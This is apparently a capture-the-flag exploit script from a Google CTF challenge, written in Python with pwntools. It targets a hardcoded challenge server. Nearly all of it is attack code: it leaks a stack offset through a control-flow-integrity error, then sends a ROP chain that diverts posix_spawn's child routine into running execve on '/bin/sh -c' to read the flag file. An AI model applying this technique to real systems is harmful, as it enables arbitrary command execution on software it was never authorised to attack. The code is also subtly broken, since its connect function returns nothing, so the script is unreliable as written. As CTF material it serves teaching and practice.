#!/usr/bin/python
#
# Copyright 2018 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

#!/usr/bin/env python2

from pwn import *

STACK = 0xfffff000
LIBC = 0xff544000
CLOSE_IN_CHILD = LIBC + 0x57418
EXECVE = LIBC + 0x56cc0
BINSH = LIBC + 0xb542c
DASH_C = LIBC + 0xb5434
STACK_FRAME_SIZE = 0x138

def connect():
  HOST = '104.155.4.100'
  PORT = 1337
  r = remote(HOST, PORT)

def send_data(addr, data):
  r.readuntil('addr?')
  r.sendline('{:x}'.format(addr))

  r.readuntil('len?')
  r.sendline('{:x}'.format(len(data)))

  r.readuntil('data?')
  r.send(data)

# First we leak the address of the return address on the stack
# * fill the stack with a cyclic sequence
# * the CFI violation will tell us the right offset
r = connect()
send_data(STACK, cyclic(0xff0))
r.readuntil('illegally targeted 0x')
leak = int(r.readline().strip(), 16)
RET_ADDR_AT = STACK + cyclic_find(leak) + 8*8

# the args to execve
rdi = BINSH
rsi = RET_ADDR_AT + STACK_FRAME_SIZE + 8
rdx = 0

# return into the child function of posix_spawn
rop = p64(CLOSE_IN_CHILD)
# fill the stack frame with some data so that the function doesn't crash
rop += p64(RET_ADDR_AT+16)
rop += '\x00'*0x88

# the child calls a function pointer with arguments from the stack
# we're allowed to call execve here, since that's what it normally does
rop += p64(rdi) + p64(EXECVE) + '\x00'*0x10 + p64(rsi) + p64(rdx)
# fill the rest of the stack frame with zeroes
rop = rop.ljust(STACK_FRAME_SIZE+8, '\x00')

# this is the address that we chose for rsi (our argv)
rop += p64(BINSH)
rop += p64(DASH_C)
rop += p64(RET_ADDR_AT + len(rop) + 16)
rop += p64(0)
rop += "cat /flag.txt\x00"

# send the rop chain and read the flag
r = connect()
send_data(RET_ADDR_AT, rop)
r.clean_and_log()
